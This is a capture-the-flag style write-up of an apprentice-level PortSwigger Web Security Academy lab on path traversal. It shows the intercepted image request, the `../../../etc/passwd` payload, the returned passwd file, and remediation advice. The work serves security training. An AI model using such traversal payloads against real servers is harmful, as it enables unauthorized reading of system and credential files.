# File Path Traversal — Simple Case

> **Platform:** PortSwigger Web Security Academy  
> **Difficulty:** Apprentice  
> **Category:** Path Traversal  
> **Status:** ✅ Solved

---

## Vulnerability Overview

Path Traversal (Directory Traversal) allows an attacker to read arbitrary files on the server's filesystem by manipulating file path parameters. The application fails to sanitize user-supplied input before using it to construct file paths.

The sequence `../` is a valid filesystem directive meaning **"go up one directory level."** When unsanitized, it allows escaping the intended base directory entirely.

---

## Reconnaissance

Browsing the target application, product pages load images dynamically via a dedicated endpoint. Intercepting a standard image request with Burp Suite reveals the vulnerable parameter:

```http
GET /image?filename=51.jpg HTTP/1.1
Host: 0a74001c046426b28977363f00600027.web-security-academy.net
```

The `filename` parameter directly controls which file is loaded from disk. No validation or sanitization is applied — the value is appended directly to the base path `/var/www/images/` on the server.

---

## Exploitation

The attack leverages `../` sequences to traverse above the web root and reach sensitive system files.

**Path resolution step by step:**

```
/var/www/images/   ← server base path
         ../       ← step up to /var/www/
         ../       ← step up to /var/
         ../       ← step up to / (filesystem root)
    etc/passwd     ← target file
```

**Crafted request (sent via Burp Repeater):**

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: 0a74001c046426b28977363f00600027.web-security-academy.net
Cookie: session=rgIcFbakYchz0FX0lDKTTg2RrD1hehvW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
```

---

## Server Response

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

The server responded with **HTTP 200** and returned the full contents of `/etc/passwd`, confirming unrestricted file read via path traversal.

> **Note:** The `Content-Type` header remained `image/jpeg` despite returning a text file — revealing the server applies no content-type validation either.

**Notable users extracted:**

| Username | UID   | Home Directory        | Shell       |
|----------|-------|-----------------------|-------------|
| root     | 0     | /root                 | /bin/bash   |
| peter    | 12001 | /home/peter           | /bin/bash   |
| carlos   | 12002 | /home/carlos          | /bin/bash   |
| www-data | 33    | /var/www              | nologin     |
| postgres | 107   | /var/lib/postgresql   | /bin/bash   |
| mysql    | 106   | /nonexistent          | /bin/false  |

---

## Impact

- Read sensitive system files (`/etc/shadow`, SSH private keys, config files)
- Enumerate valid system users for brute-force or privilege escalation
- Leak application source code, credentials, and API keys
- Read internal service configs (MySQL, PostgreSQL, web server)
- Potential stepping stone to Remote Code Execution in certain scenarios

---

## Remediation

- Validate user input against an allowlist of permitted filenames
- Use `realpath()` or equivalent to resolve the canonical path, then verify it starts with the expected base directory
- Never concatenate raw user input into filesystem paths
- Apply principle of least privilege — the web server process should not have read access to `/etc/passwd`
- Store files outside the web root and serve via indirect mapping (e.g., database ID → filename)

---

## References

- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---

*by [XENOS](https://obadahamed.github.io) · obadahamed*
